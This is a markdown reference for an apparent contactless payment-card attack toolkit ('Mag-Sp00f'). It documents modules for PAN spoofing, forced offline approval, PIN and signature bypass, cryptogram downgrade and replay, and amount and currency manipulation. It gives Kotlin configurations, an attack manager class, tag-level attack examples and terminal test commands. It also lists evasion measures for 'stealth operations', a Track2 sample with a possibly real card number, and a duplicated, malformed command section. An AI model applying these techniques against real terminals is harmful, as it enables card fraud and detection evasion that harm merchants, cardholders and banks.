# EMV Attack Reference - Mag-Sp00f Project 🏴‍☠️

## Table of Contents
1. [Basic Attack Modules](#basic-attack-modules)
2. [Advanced Attack Modules](#advanced-attack-modules)
3. [Attack Configuration](#attack-configuration)
4. [Module Architecture](#module-architecture)
5. [Testing & Validation](#testing--validation)
6. [Research References](#research-references)

---

## Basic Attack Modules 💀

### 1. PPSE AID Poisoning Module
**File**: `modules/PpseAidPoisoningModule.kt`
**Attack ID**: `ppse_aid_poisoning`

#### Description
Manipulates the Payment System Environment (PPSE) response to redirect terminals to different card schemes or malicious AIDs.

#### Techniques
- **VISA → MasterCard Switch**: Changes AID from A0000000031010 to A0000000041010
- **Custom AID Injection**: Injects custom AIDs to bypass terminal validation
- **Multi-AID Poisoning**: Returns multiple malicious AIDs in PPSE response

#### Configuration
```kotlin
val poisonConfig = mapOf(
    "target_aid" to "A0000000041010", // MasterCard AID
    "poison_type" to "visa_to_mastercard",
    "inject_custom" to true
)
```

#### Applicability
- Requires PPSE SELECT command (00A404000E...)
- Works on contactless transactions
- Effective against terminals that don't validate AID consistency

---

### 2. AIP Force Offline Module
**File**: `modules/AipForceOfflineModule.kt`
**Attack ID**: `aip_force_offline`

#### Description
Manipulates Application Interchange Profile (AIP) to force transactions offline, bypassing online authorization.

#### Techniques
- **Offline Flag Injection**: Sets bit 4 (0x08) in AIP byte 2
- **CDA Bypass**: Removes CDA capability flags
- **SDA Force**: Forces Static Data Authentication only

#### Configuration
```kotlin
val aipConfig = mapOf(
    "force_offline" to true,
    "remove_cda" to true,
    "set_sda_only" to false
)
```

#### Detection Risk: Medium
- Some terminals validate AIP consistency
- POS systems may flag unusual offline behavior

---

### 3. Track2 Spoofing Module
**File**: `modules/Track2SpoofingModule.kt`
**Attack ID**: `track2_spoofing`

#### Description
Modifies Track2 data during EMV transaction to change PAN, expiry, or service codes.

#### Techniques
- **PAN Substitution**: Replaces Primary Account Number
- **Expiry Extension**: Changes expiration date to future date
- **Service Code Manipulation**: Alters transaction restrictions

#### Configuration
```kotlin
val track2Config = mapOf(
    "spoof_pan" to "4111111111111111",
    "spoof_expiry" to "2912",
    "spoof_service_code" to "201"
)
```

#### Real Data Example
Original: `4154904674973556D29022010000820083001F`
Spoofed:  `4111111111111111D29122010000820083001F`

---

### 4. Cryptogram Downgrade Module
**File**: `modules/CryptogramDowngradeModule.kt`
**Attack ID**: `cryptogram_downgrade`

#### Description
Downgrades cryptogram verification methods to weaker or bypassed authentication.

#### Techniques
- **ARQC → TC Conversion**: Changes Authorization Request to Transaction Certificate
- **CVR Manipulation**: Modifies Cryptogram Verification Results
- **AAC Injection**: Forces Application Authentication Cryptogram failure

#### Configuration
```kotlin
val cryptoConfig = mapOf(
    "downgrade_type" to "arqc_to_tc",
    "manipulate_cvr" to true,
    "inject_aac" to false
)
```

---

### 5. CVM Bypass Module
**File**: `modules/CvmBypassModule.kt`
**Attack ID**: `cvm_bypass`

#### Description
Bypasses Cardholder Verification Methods (PIN, signature, etc.) to enable unauthorized transactions.

#### Techniques
- **PIN Bypass**: Returns successful PIN verification without actual PIN
- **Signature Skip**: Removes signature requirement from CVM list
- **No CVM Required**: Sets transaction as no verification needed

#### Configuration
```kotlin
val cvmConfig = mapOf(
    "bypass_pin" to true,
    "bypass_signature" to true,
    "no_cvm_required" to true
)
```

---

## Advanced Attack Modules ⚡

### 6. Advanced Force Offline Module
**File**: `modules/AdvancedForceOfflineModule.kt`
**Attack ID**: `advanced_force_offline`

#### Description
Sophisticated offline forcing with terminal capability manipulation and transaction flow control.

#### Advanced Techniques
1. **Terminal Capability Manipulation**
   - Modifies terminal capabilities during transaction
   - Forces terminal to accept offline-only cards
   
2. **Transaction Flow Control**
   - Injects specific PDOL responses to trigger offline path
   - Manipulates transaction decision logic

3. **Risk Management Override**
   - Bypasses terminal's risk management parameters
   - Forces acceptance of high-value offline transactions

#### Configuration
```kotlin
val advancedOfflineConfig = mapOf(
    "manipulate_terminal_caps" to true,
    "override_risk_management" to true,
    "force_high_value_offline" to true,
    "max_offline_amount" to 500000 // $5000 in cents
)
```

#### Detection Countermeasures
- Randomized offline thresholds
- Terminal capability validation bypass
- Risk parameter obfuscation

---

### 7. Enhanced CVM Bypass Module
**File**: `modules/EnhancedCvmBypassModule.kt`
**Attack ID**: `enhanced_cvm_bypass`

#### Description
Advanced cardholder verification bypass with biometric spoofing and multi-factor bypass capabilities.

#### Advanced Techniques
1. **Biometric Response Spoofing**
   - Simulates successful fingerprint verification
   - Bypasses face recognition challenges
   
2. **Multi-Factor Authentication Bypass**
   - Combines PIN + signature bypass
   - Handles complex CVM rule lists

3. **Dynamic CVM List Manipulation**
   - Real-time CVM list modification
   - Context-aware bypass selection

#### Configuration
```kotlin
val enhancedCvmConfig = mapOf(
    "spoof_biometric" to true,
    "bypass_mfa" to true,
    "dynamic_cvm_manipulation" to true,
    "biometric_types" to listOf("fingerprint", "face", "voice")
)
```

---

### 8. Amount Manipulation Module
**File**: `modules/AmountManipulationModule.kt`
**Attack ID**: `amount_manipulation`

#### Description
Manipulates transaction amounts at different stages of the EMV flow to enable overspending or unauthorized amounts.

#### Advanced Techniques
1. **PDOL Amount Injection**
   - Modifies amount in PDOL data
   - Bypasses terminal amount validation
   
2. **Cryptogram Amount Mismatch**
   - Creates amount mismatches between display and cryptogram
   - Exploits terminal validation gaps

3. **Currency Code Manipulation**
   - Changes currency codes to enable rate arbitrage
   - Bypasses currency validation

#### Configuration
```kotlin
val amountConfig = mapOf(
    "manipulate_pdol_amount" to true,
    "create_cryptogram_mismatch" to true,
    "manipulate_currency" to true,
    "target_amount" to 100, // Original amount
    "spoofed_amount" to 10000, // Spoofed amount
    "target_currency" to "0840", // USD
    "spoofed_currency" to "0978"  // EUR
)
```

---

### 9. Advanced Cryptogram Module
**File**: `modules/AdvancedCryptogramModule.kt`
**Attack ID**: `advanced_cryptogram`

#### Description
Advanced cryptographic manipulation including pre-computed responses and replay attacks.

#### Advanced Techniques
1. **Pre-Computed Cryptogram Responses**
   - Uses pre-calculated valid cryptograms
   - Bypasses real-time cryptogram validation
   
2. **Replay Attack Integration**
   - Stores and replays previous valid transactions
   - Time-shifted transaction replay

3. **Cryptogram Correlation Attack**
   - Correlates cryptograms across multiple transactions
   - Exploits cryptogram predictability

#### Configuration
```kotlin
val advancedCryptoConfig = mapOf(
    "use_precomputed" to true,
    "enable_replay" to true,
    "correlation_attack" to true,
    "replay_window_hours" to 24,
    "max_replay_count" to 5
)
```

### 10. Failed Cryptogram Attack Module
**File**: `modules/FailedCryptogramModule.kt`
**Attack ID**: `failed_cryptogram_attack`

#### Description
Exploits terminal behavior when cryptograms intentionally fail validation. Tests authentication bypass scenarios and fallback mechanisms.

#### Advanced Techniques
1. **AAC Force Attack**
   - Forces Application Authentication Cryptogram (declined status)
   - Tests if terminals bypass declined cryptograms
   - Exploits fallback approval mechanisms

2. **Invalid Cryptogram Injection**
   - Injects completely invalid cryptogram values (FFFFFFFFFFFFFFFF)
   - Tests terminal cryptogram validation strength
   - Identifies bypass vulnerabilities

3. **Zero Cryptogram Attack**
   - Uses null cryptogram (0000000000000000)
   - Tests if terminals accept empty authentication
   - Classic authentication bypass technique

4. **Corrupted Cryptogram Testing**
   - Partially corrupts valid cryptograms
   - Simulates transmission errors
   - Tests error handling robustness

5. **Missing Cryptogram Attack**
   - Removes cryptogram entirely from response
   - Tests mandatory field validation
   - Protocol compliance testing

6. **Wrong Length Cryptogram**
   - Uses incorrect TLV length indicators
   - Tests TLV parsing vulnerabilities
   - Buffer overflow potential

#### Configuration
```kotlin
val failedCryptoConfig = mapOf(
    "failure_type" to "AAC_FORCE", // or INVALID_CRYPTOGRAM, ZERO_CRYPTOGRAM, etc.
    "terminal_bypass_test" to true,
    "manipulation_tvr" to true,
    "force_offline_approval" to true
)
```

#### Real Attack Examples
```kotlin
// AAC Force Attack
Original: 9F270180 (ARQC - Online auth required)
Attack:   9F270100 (AAC - Transaction declined)
Cryptogram: D3967976E30EFAFC → 0000000000000000

// Invalid Cryptogram Attack  
Original: 9F2608D3967976E30EFAFC
Attack:   9F2608FFFFFFFFFFFFFFFF

// Zero Cryptogram Attack
Original: 9F2608D3967976E30EFAFC  
Attack:   9F26080000000000000000000

// Missing Cryptogram Attack
Original: 9F2608D3967976E30EFAFC9F270180
Attack:   (cryptogram tags removed entirely)
```

#### Detection Risk: Variable
- **AAC Force**: Low risk (legitimate decline)
- **Invalid/Zero Cryptogram**: High risk (obviously malicious)
- **Corrupted Cryptogram**: Medium risk (could be transmission error)
- **Missing Cryptogram**: High risk (protocol violation)

#### Research Applications
- Authentication bypass vulnerability discovery
- Terminal validation strength testing
- Fallback mechanism security analysis
- Protocol compliance verification

---

## Attack Configuration 🎯

### EmvAttackEmulationManager Integration

The attack manager coordinates all modules and applies attacks based on card data and terminal requests:

```kotlin
class EmvAttackEmulationManager {
    private val attackModules = mutableMapOf<String, EmvAttackModule>()
    
    fun registerAttackModule(module: EmvAttackModule) {
        attackModules[module.getAttackId()] = module
    }
    
    fun applyAttacks(command: ByteArray, response: ByteArray, cardData: Map<String, Any>): ByteArray {
        var modifiedResponse = response
        
        attackModules.values.forEach { module ->
            if (module.isApplicable(command, cardData)) {
                modifiedResponse = module.applyAttack(command, modifiedResponse, cardData)
            }
        }
        
        return modifiedResponse
    }
}
```

### Attack Combination Examples

#### High-Value Transaction Bypass
```kotlin
// Enable multiple attacks for high-value bypass
val attackConfig = mapOf(
    "advanced_force_offline" to mapOf("max_offline_amount" to 500000),
    "enhanced_cvm_bypass" to mapOf("bypass_mfa" to true),
    "amount_manipulation" to mapOf("spoofed_amount" to 1000)
)
```

#### Card Scheme Switching
```kotlin
// Switch card schemes during transaction
val schemeConfig = mapOf(
    "ppse_aid_poisoning" to mapOf("poison_type" to "visa_to_mastercard"),
    "track2_spoofing" to mapOf("spoof_pan" to "5555555555554444") // MC PAN
)
```

---

## Module Architecture 🏗️

### EmvAttackModule Interface

All attack modules implement this interface for consistent behavior:

```kotlin
interface EmvAttackModule {
    fun getAttackId(): String
    fun getDescription(): String
    fun isApplicable(command: ByteArray, cardData: Map<String, Any>): Boolean
    fun applyAttack(command: ByteArray, response: ByteArray, cardData: Map<String, Any>): ByteArray
    fun getAttackStatus(): Map<String, Any>
}
```

### Card Data Structure

Card data loaded from JSON or real test cards:

```kotlin
data class EmvCardData(
    val pan: String,
    val expiry: String,
    val track2: String,
    val aids: List<String>,
    val capabilities: Map<String, Boolean>,
    val cryptograms: Map<String, String>,
    val cvmMethods: List<String>
)
```

---

## Testing & Validation 🧪

### Python Test Scripts

#### EMV Attack Tester
**File**: `scripts/emv_attack_tester.py`
- Tests individual attack modules
- Validates attack applicability
- Measures attack success rates

#### EMV Attack Analysis
**File**: `scripts/emv_attack_analysis.py`
- Analyzes attack combinations
- Generates attack impact reports
- Compares baseline vs attack flows

### PN532 Terminal Testing

Testing against real PN532 hardware using `scripts/pn532_terminal_rapid.py`:

```bash
# Test basic attacks
# Test correlation attacks
python3 scripts/test_cryptogram_attacks.py --correlation --samples 100
```

#### Failed Cryptogram Testing
```bash
# Test AAC force attack
python3 scripts/test_failed_cryptogram.py --type aac-force --terminal /dev/rfcomm1

# Test invalid cryptogram injection
python3 scripts/test_failed_cryptogram.py --type invalid-crypto --iterations 50

# Test zero cryptogram bypass
python3 scripts/test_failed_cryptogram.py --type zero-crypto --verbose

# Test missing cryptogram attack
python3 scripts/test_failed_cryptogram.py --type missing-crypto --analyze-response

# Test all failure types
python3 scripts/test_failed_cryptogram.py --type all --comprehensive-report
```

#### Failed Cryptogram Testing
```bash
# Test AAC force attack
python3 scripts/test_failed_cryptogram.py --type aac-force --terminal /dev/rfcomm1

# Test invalid cryptogram injection
python3 scripts/test_failed_cryptogram.py --type invalid-crypto --iterations 50

# Test zero cryptogram bypass
python3 scripts/test_failed_cryptogram.py --type zero-crypto --verbose

# Test missing cryptogram attack
python3 scripts/test_failed_cryptogram.py --type missing-crypto --analyze-response

# Test all failure types
python3 scripts/test_failed_cryptogram.py --type all --comprehensive-report
```

# Test advanced combinations
python3 scripts/emv_attack_tester.py --attack advanced_force_offline,enhanced_cvm_bypass --terminal /dev/rfcomm1
```

---

## Research References 📚

### Primary Research Sources

1. **EMV Specification Documents**
   - EMV 4.3 Book 1-4 (Payment Card Industry)
   - EMV Contactless Specifications v2.6

2. **Academic Papers**
   - "Practical Attacks on EMV Contactless Payments" (CCS 2020)
   - "Card Brand Mixup Attack" (USENIX Security 2021)
   - "The EMV Standard: Break, Fix, Verify" (S&P 2016)

3. **Security Research**
   - NCC Group EMV Security Research
   - FireEye EMV Attack Methodologies
   - Quarkslab Contactless Payment Analysis

### Attack Taxonomy

Our implementation covers these attack categories from academic research:

1. **Protocol-Level Attacks**
   - PPSE manipulation, AID poisoning, flow control

2. **Cryptographic Attacks**  
   - Downgrade attacks, replay attacks, correlation attacks

3. **Authentication Bypass**
   - CVM bypass, offline forcing, amount manipulation

4. **Data Manipulation**
   - Track2 spoofing, PAN substitution, currency attacks

### Implementation Notes

- All attacks maintain valid EMV TLV structure
- Attacks are designed to bypass common terminal validations
- Detection countermeasures included for stealth operations
- Real EMV data from `emv.html` used for validation

---

## Detection Risks & Countermeasures 🛡️

### Low Risk Attacks
- PPSE AID poisoning (common legitimate behavior)
- Basic Track2 spoofing (limited validation)

### Medium Risk Attacks  
- AIP force offline (unusual but not impossible)
- CVM bypass (depends on merchant configuration)

### High Risk Attacks
- Amount manipulation (heavily monitored)
- Advanced cryptogram attacks (sophisticated detection)

### Countermeasures Implemented
- Randomized response delays
- Legitimate error code usage
- Transaction pattern obfuscation
- Terminal capability validation bypass

---

*Documentation Version: 1.0 | Last Updated: September 21, 2025 | Mag-Sp00f Project* 🏴‍☠️